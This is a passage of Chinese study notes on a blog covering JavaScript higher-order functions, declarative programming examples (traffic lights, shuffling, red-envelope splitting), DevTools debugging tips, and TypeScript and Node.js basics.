class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">clearTimeout</span>(timer);</span><br><span class="line">    timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      fn.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;, dur);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Consumer 同步函数变异步。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">consumer</span>(<span class="params">fn, time</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> tasks = [],</span><br><span class="line">      timer;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">    tasks.push(fn.bind(<span class="built_in">this</span>, ...args));</span><br><span class="line">    <span class="keyword">if</span>(timer == <span class="literal">null</span>)&#123;</span><br><span class="line">      timer = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        tasks.shift().call(<span class="built_in">this</span>)</span><br><span class="line">        <span class="keyword">if</span>(tasks.length &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">          <span class="built_in">clearInterval</span>(timer);</span><br><span class="line">          timer = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, time)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://code.h5jun.com/roka/7/edit?js,console,output">例子1</a>、<a href="https://code.h5jun.com/bucu/3/edit?js,output">例子2</a></p></li><li><p><a href="https://code.h5jun.com/kapef/edit?js,output">Iterative</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterative</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">subject, ...rest</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isIterable(subject)) &#123;</span><br><span class="line">      <span class="keyword">const</span> ret = [];</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> obj <span class="keyword">of</span> subject) &#123;</span><br><span class="line">        ret.push(fn.apply(<span class="built_in">this</span>, [obj, ...rest]));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fn.apply(<span class="built_in">this</span>, [subject, ...rest]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="为什么使用高阶函数？"><a href="#为什么使用高阶函数？" class="headerlink" title="为什么使用高阶函数？"></a><strong>为什么使用高阶函数？</strong></h3><p>代码可维护…如代码库的平稳升级：</p><p><img src="https://i.loli.net/2021/08/17/Pt9LqASyuVIN7OE.png" alt="image.png"></p><h2 id="命令式与声明式"><a href="#命令式与声明式" class="headerlink" title="命令式与声明式"></a>命令式与声明式</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 命令式 （我们要怎么做）</span></span><br><span class="line"><span class="keyword">let</span> list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">let</span> map1 = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; list.length; i++)&#123;</span><br><span class="line">map1.push(list[i] * <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明式 （我们要做什么）</span></span><br><span class="line"><span class="keyword">let</span> list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">const</span> double = <span class="function"><span class="params">x</span> =&gt;</span> x * <span class="number">2</span>;</span><br><span class="line">list.map(double);</span><br></pre></td></tr></table></figure><h3 id="case：切换按钮"><a href="#case：切换按钮" class="headerlink" title="case：切换按钮"></a>case：切换按钮</h3><p><a href="https://code.h5jun.com/tuda/2/edit?js,output">命令式</a>：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">switcher.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(evt.target.className === <span class="string">&#x27;on&#x27;</span>)&#123;</span><br><span class="line">    evt.target.className = <span class="string">&#x27;off&#x27;</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    evt.target.className = <span class="string">&#x27;on&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://code.h5jun.com/nal/3/edit?js,output">声明式</a>：(若想变成三态、直接添加 <code>evt =&gt; evt.target.className = &#39;warn&#39; </code>)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toggle</span>(<span class="params">...actions</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> action = actions.shift();</span><br><span class="line">    actions.push(action);</span><br><span class="line">    <span class="keyword">return</span> action.apply(<span class="built_in">this</span>, args);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">switcher.onclick = toggle(</span><br><span class="line">  <span class="function"><span class="params">evt</span> =&gt;</span> evt.target.className = <span class="string">&#x27;off&#x27;</span>,</span><br><span class="line">  <span class="function"><span class="params">evt</span> =&gt;</span> evt.target.className = <span class="string">&#x27;on&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="Case：实现一个切换多个交通灯状态切换的功能"><a href="#Case：实现一个切换多个交通灯状态切换的功能" class="headerlink" title="Case：实现一个切换多个交通灯状态切换的功能"></a>Case：实现一个切换多个交通灯状态切换的功能</h2><h3 id="方法一、直观实现"><a href="#方法一、直观实现" class="headerlink" title="方法一、直观实现"></a>方法一、直观实现</h3><p>（很丑）参考代码见<a href="https://code.h5jun.com/jezew/2/edit?js,output%EF%BC%8C%E4%B8%BB%E8%A6%81">https://code.h5jun.com/jezew/2/edit?js,output，主要</a> js 部分如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> traffic = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;traffic&#x27;</span>);</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">reset</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  traffic.className = <span class="string">&#x27;s1&#x27;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      traffic.className = <span class="string">&#x27;s2&#x27;</span>;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        traffic.className = <span class="string">&#x27;s3&#x27;</span>;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          traffic.className = <span class="string">&#x27;s4&#x27;</span>;</span><br><span class="line">          <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            traffic.className = <span class="string">&#x27;s5&#x27;</span>;</span><br><span class="line">            <span class="built_in">setTimeout</span>(reset, <span class="number">1000</span>)</span><br><span class="line">          &#125;, <span class="number">1000</span>)</span><br><span class="line">        &#125;, <span class="number">1000</span>)</span><br><span class="line">      &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h3 id="方法二、数据抽象"><a href="#方法二、数据抽象" class="headerlink" title="方法二、数据抽象"></a>方法二、数据抽象</h3><p>参考代码见 <a href="https://code.h5jun.com/xof/5/edit?js,output%EF%BC%8C">https://code.h5jun.com/xof/5/edit?js,output，</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> traffic = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;traffic&#x27;</span>);</span><br><span class="line"><span class="comment">// 抽象出数据列表</span></span><br><span class="line"><span class="keyword">const</span> stateList = [</span><br><span class="line">  &#123;<span class="attr">state</span>: <span class="string">&#x27;wait&#x27;</span>, <span class="attr">last</span>: <span class="number">1000</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">state</span>: <span class="string">&#x27;stop&#x27;</span>, <span class="attr">last</span>: <span class="number">3000</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">state</span>: <span class="string">&#x27;pass&#x27;</span>, <span class="attr">last</span>: <span class="number">3000</span>&#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params">traffic, stateList</span>)</span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">applyState</span>(<span class="params">stateIdx</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;state, last&#125; = stateList[stateIdx];</span><br><span class="line">    traffic.className = state;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      applyState((stateIdx + <span class="number">1</span>) % stateList.length);</span><br><span class="line">    &#125;, last)</span><br><span class="line">  &#125;</span><br><span class="line">  applyState(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">start(traffic, stateList);</span><br></pre></td></tr></table></figure><h3 id="方法三、过程抽象"><a href="#方法三、过程抽象" class="headerlink" title="方法三、过程抽象"></a>方法三、过程抽象</h3><p><strong>将 start 方法抽象成轮询方法</strong>，通过高阶函数。参考代码见 <a href="https://code.h5jun.com/bodul/2/edit?js,output%EF%BC%8C">https://code.h5jun.com/bodul/2/edit?js,output，</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> traffic = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;traffic&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 轮询方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">poll</span>(<span class="params">...fnList</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> stateIndex = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> fn = fnList[stateIndex++ % fnList.length];</span><br><span class="line">    <span class="keyword">return</span> fn.apply(<span class="built_in">this</span>, args);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setState</span>(<span class="params">state</span>)</span>&#123;</span><br><span class="line">  traffic.className = state;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> trafficStatePoll = poll(setState.bind(<span class="literal">null</span>, <span class="string">&#x27;wait&#x27;</span>),</span><br><span class="line">                            setState.bind(<span class="literal">null</span>, <span class="string">&#x27;stop&#x27;</span>),</span><br><span class="line">                            setState.bind(<span class="literal">null</span>, <span class="string">&#x27;pass&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(trafficStatePoll, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure><h3 id="方法四、异步实现"><a href="#方法四、异步实现" class="headerlink" title="方法四、异步实现"></a>方法四、异步实现</h3><p>命令式写法。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> traffic = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;traffic&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wait</span>(<span class="params">time</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, time));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setState</span>(<span class="params">state</span>)</span>&#123;</span><br><span class="line">  traffic.className = state;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  setState(<span class="string">&#x27;wait&#x27;</span>);</span><br><span class="line">    <span class="keyword">await</span> wait(<span class="number">1000</span>);</span><br><span class="line">    setState(<span class="string">&#x27;stop&#x27;</span>);</span><br><span class="line">    <span class="keyword">await</span> wait(<span class="number">3000</span>);</span><br><span class="line">    setState(<span class="string">&#x27;pass&#x27;</span>);</span><br><span class="line">    <span class="keyword">await</span> wait(<span class="number">3000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="Case：判断是否是4的幂"><a href="#Case：判断是否是4的幂" class="headerlink" title="Case：判断是否是4的幂"></a>Case：判断是否是4的幂</h2><h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPowerOfFour</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">num = <span class="built_in">parseInt</span>(num);</span><br><span class="line"><span class="keyword">while</span>(num &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(num % <span class="number">4</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">num /= <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPowerOfFour</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">num = <span class="built_in">parseInt</span>(num);</span><br><span class="line"><span class="keyword">while</span>(num &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(num % <span class="number">0b11</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">num &gt;&gt;&gt;= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前两种时间复杂度都为 O（logN）。</p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPowerOfFour</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">num = <span class="built_in">parseInt</span>(num);</span><br><span class="line">    <span class="comment">// 第二个过滤出2的幂</span></span><br><span class="line"><span class="keyword">return</span> num &gt; <span class="number">0</span> &amp;&amp; (num &amp; (num - <span class="number">1</span>)) === <span class="number">0</span> &amp;&amp; (num &amp; <span class="number">0xAAAAAAAA</span>) === <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度为 O（1），但好像没必要。</p><h3 id="方法四、正则"><a href="#方法四、正则" class="headerlink" title="方法四、正则"></a>方法四、正则</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPowerOfFour</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">num = <span class="built_in">parseInt</span>(num).toString(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="regexp">/^1(?:00)*$/</span>.test(num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Case：洗牌"><a href="#Case：洗牌" class="headerlink" title="Case：洗牌"></a>Case：洗牌</h2><h3 id="方法一（不正确）"><a href="#方法一（不正确）" class="headerlink" title="方法一（不正确）"></a>方法一（不正确）</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cards = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shuffle</span>(<span class="params">cards</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [...cards].sort(<span class="function">() =&gt;</span> <span class="built_in">Math</span>.random() &gt; <span class="number">0.5</span> ? -<span class="number">1</span> : <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(shuffle(cards));</span><br></pre></td></tr></table></figure><p>结果并不是公平的！因为 <strong>sort 是两两交换，导致最后面的数交换到最前面的可能性较小</strong>。</p><h3 id="方法二-2"><a href="#方法二-2" class="headerlink" title="方法二"></a>方法二</h3><p>在前面的牌中随机抽一张，再换到最后的位置去。<a href="https://code.h5jun.com/huqi/edit?js,console,output">https://code.h5jun.com/huqi/edit?js,console,output</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cards = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shuffle</span>(<span class="params">cards</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> c = [...cards];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = c.length; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">    <span class="keyword">const</span> pIdx = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * i);</span><br><span class="line">    [c[pIdx], c[i - <span class="number">1</span>]] = [c[i - <span class="number">1</span>], c[pIdx]];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">const</span> result = <span class="built_in">Array</span>(<span class="number">10</span>).fill(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">const</span> c = shuffle(cards);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">    result[j] += c[j];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(shuffle(cards));</span><br><span class="line"><span class="built_in">console</span>.log(result);</span><br></pre></td></tr></table></figure><h3 id="方法三（改进）"><a href="#方法三（改进）" class="headerlink" title="方法三（改进）"></a>方法三（改进）</h3><p>不洗完所有的牌，借助<strong>生成器</strong>。<a href="https://code.h5jun.com/zamuv/edit?js,console,output">https://code.h5jun.com/zamuv/edit?js,console,output</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cards = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> * <span class="title">draw</span>(<span class="params">cards</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> c = [...cards];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = c.length; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">    <span class="keyword">const</span> pIdx = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * i);</span><br><span class="line">    [c[pIdx], c[i - <span class="number">1</span>]] = [c[i - <span class="number">1</span>], c[pIdx]];</span><br><span class="line">    <span class="keyword">yield</span> c[i - <span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> result = draw(cards);</span><br><span class="line"><span class="built_in">console</span>.log([...result]);</span><br></pre></td></tr></table></figure><h2 id="Case：分红包"><a href="#Case：分红包" class="headerlink" title="Case：分红包"></a>Case：分红包</h2><h3 id="方法一-2"><a href="#方法一-2" class="headerlink" title="方法一"></a>方法一</h3><p>每次切最大的红包。弊端：有点均匀。<a href="https://code.h5jun.com/wuv/1/edit?js,console,output">https://code.h5jun.com/wuv/1/edit?js,console,output</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate</span>(<span class="params">amount, count</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ret = [amount];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span>(count &gt; <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">//挑选出最大一块进行切分</span></span><br><span class="line">    <span class="keyword">let</span> cake = <span class="built_in">Math</span>.max(...ret),</span><br><span class="line">        idx = ret.indexOf(cake),</span><br><span class="line">        part = <span class="number">1</span> + <span class="built_in">Math</span>.floor((cake / <span class="number">2</span>) * <span class="built_in">Math</span>.random()),</span><br><span class="line">        rest = cake - part;</span><br><span class="line">    </span><br><span class="line">    ret.splice(idx, <span class="number">1</span>, part, rest);</span><br><span class="line">    </span><br><span class="line">    count--;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> amountEl = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;amount&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> countEl = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;count&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> generateBtn = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;generateBtn&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> resultEl = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;result&#x27;</span>);</span><br><span class="line"></span><br><span class="line">generateBtn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> amount = <span class="built_in">Math</span>.round(<span class="built_in">parseFloat</span>(amountEl.value) * <span class="number">100</span>);</span><br><span class="line">  <span class="keyword">let</span> count = <span class="built_in">parseInt</span>(countEl.value);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">let</span> output = [];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">isNaN</span>(amount) || <span class="built_in">isNaN</span>(count) </span><br><span class="line">     || amount &lt;= <span class="number">0</span> || count &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">    output.push(<span class="string">&#x27;输入格式不正确！&#x27;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(amount &lt; count)&#123;</span><br><span class="line">    output.push(<span class="string">&#x27;钱不够分&#x27;</span>)</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    output.push(...generate(amount, count));</span><br><span class="line">    output = output.map(<span class="function"><span class="params">m</span> =&gt;</span> (m / <span class="number">100</span>).toFixed(<span class="number">2</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  resultEl.innerHTML = <span class="string">&#x27;&lt;li&gt;&#x27;</span> + </span><br><span class="line">                        output.join(<span class="string">&#x27;&lt;/li&gt;&lt;li&gt;&#x27;</span>) +</span><br><span class="line">                       <span class="string">&#x27;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法二-3"><a href="#方法二-3" class="headerlink" title="方法二"></a>方法二</h3><p>切分，类似于洗牌，以分为单元，再1——9999中洗牌，切最前面10刀。（不存在法一的问题）</p><p><img src="https://i.loli.net/2021/08/17/7ELKMjhesOnvUJ8.png" alt="image.png"></p><h1 id="前端开发调试知识"><a href="#前端开发调试知识" class="headerlink" title="前端开发调试知识"></a>前端开发调试知识</h1><h2 id="动态修改元素与样式"><a href="#动态修改元素与样式" class="headerlink" title="动态修改元素与样式"></a>动态修改元素与样式</h2><h3 id="一、Elements"><a href="#一、Elements" class="headerlink" title="一、Elements"></a>一、Elements</h3><ul><li>DevTools 里面 Styles 中点击 .cls 开启动态修改元素的 class，输入字符串可以动态的给元素添加类名。</li><li>Computed 下点击样式里的箭头可以跳转到 styles 面板中的 css 规则。</li><li>修改动态样式（:hover）时，可以如第一点，点击 :hov ；或者 DOM 元素右击 -&gt; Force state -&gt; :hover。</li></ul><h3 id="二、Console"><a href="#二、Console" class="headerlink" title="二、Console"></a>二、Console</h3><ul><li> 灵活使用 log、warn、error、debug、info 查看日志。（在控制栏左侧选择等级，对日志分类查看）</li><li>console.table 具象化展示 JSON 和数组数据。</li><li>console.dir 展示<strong>对象</strong>中的属性与值（处理 DOM 节点）。</li><li>占位符：给日志添加样式，突出重要的信息。如：<code>console.log(&#39;%c%s&#39;, &#39;font-size:24px; color:red&#39;, &#39;Welcome!&#39;);</code><ul><li>%s：字符串占位符</li><li>%o：对象占位符</li><li>%c：样式占位符</li><li>%d：数字占位符</li></ul></li></ul><h3 id="三、Souces"><a href="#三、Souces" class="headerlink" title="三、Souces"></a>三、Souces</h3><p> 在网页中调试代码的方法：</p><ul><li>代码间输入 <code>debugger;</code> 然后在 Souces 中找到对应的 js 文件，自动进入调试。</li><li>点击左边行号，开始调试。（浮标能看数据）</li><li>右边有很多信息~</li></ul><p> 学会使用 <a href="https://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html">source-map</a> 映射源码。</p><h3 id="四、Performance"><a href="#四、Performance" class="headerlink" title="四、Performance"></a>四、Performance</h3><p> <img src="https://i.loli.net/2021/08/17/KLIyzGUJrCA1DBm.png" alt="image.png"></p><h1 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h1><p>‘ TS 的类型检查’与‘生成 JS ’是两个独立的过程；类型检查出错不影响生成 JavaScript 代码。</p><p><strong>类型别名：</strong>用 type 声明类型，与 let 类似，采用块级作用域。 </p><h1 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ol><li><p>异步I/O：当Node,js 执行I/O 操作时，会在响应返回并恢复操作，而不是阻塞线程并浪费CPU循环等待。</p></li><li><p>单线程：Node.js保持了JavaScript在浏览器中单线程的特点。</p><p>优点:</p><ol><li>不用处处在意状态同步问题，不会发生死锁</li><li>没有线程上下文切换带来的性能开销</li></ol><p>缺点: </p><ol><li>无法利用多核CPU</li><li>错误会引起整个应用退出，健壮性不足</li><li>大量计算占用导致CPU，无法继续执行</li></ol></li></ol><hr><hr><h1 id="9-20-Node"><a href="#9-20-Node" class="headerlink" title="9.20 Node"></a>9.20 Node</h1><p>这一部分属实学不懂。。见<a href="https://learn.kaikeba.com/video/464251">https://learn.kaikeba.com/video/464251</a></p><h2 id="Node基础Api"><a href="#Node基础Api" class="headerlink" title="Node基础Api"></a>Node基础Api</h2><p><strong>核心 API ——无需 require</strong></p><ul><li>buffer</li><li>module</li><li>process</li></ul><p><strong>内置 API ——需要 require 无需 install</strong></p><ul><li>os</li><li>fs</li><li>path</li><li>http</li><li>event</li></ul><h2 id="持久化mysql-mongodb-Restful实战"><a href="#持久化mysql-mongodb-Restful实战" class="headerlink" title="持久化mysql/mongodb/Restful实战"></a>持久化mysql/mongodb/Restful实战</h2><p>数据持久化就是将内存中的数据模型转换为存储模型，以及将存储模型转换为内存中的数据模型的统称。</p><p>数据模型可以是任何数据结构或对象模型，存储模型可以是关系模型、XML、 二进制流等。</p><ul><li>mysql</li><li>mongodb</li><li>通过模型自动映射Restful服务</li></ul><h3 id="Restful服务"><a href="#Restful服务" class="headerlink" title="Restful服务"></a>Restful服务</h3><p>Representational State Transfer 翻译过来是”表现层状态转化”，它是一种互联网软件的架构原则。因此符合<br>REST风格的Web API设计，就称它为RESTful API</p><p>RESTful特征:</p><ul><li>每一个URI代表一种资源(Resources), 比如: <code>http://kaikeba.com/courses</code> ; </li><li>客户端和服务器之间，传递这种资源的某种表现层，比如：<code>http://kaikeba.com/courses/web</code>;</li><li>客户端通过HTTP动词，对服务器端资源进行操作，实现”表现层状态转化”，比如：<code>POST http://kaikeba .com/courses</code></li></ul><h2 id="鉴权session-token-Oauth2-0实战"><a href="#鉴权session-token-Oauth2-0实战" class="headerlink" title="鉴权session/token/Oauth2.0实战"></a>鉴权session/token/Oauth2.0实战</h2><h2 id="rpc-cdn-log-监控"><a href="#rpc-cdn-log-监控" class="headerlink" title="rpc/cdn/log/监控"></a>rpc/cdn/log/监控</h2><h1 id="9-21-前端工程化"><a href="#9-21-前端工程化" class="headerlink" title="9.21 前端工程化"></a>9.21 前端工程化</h1><p><a 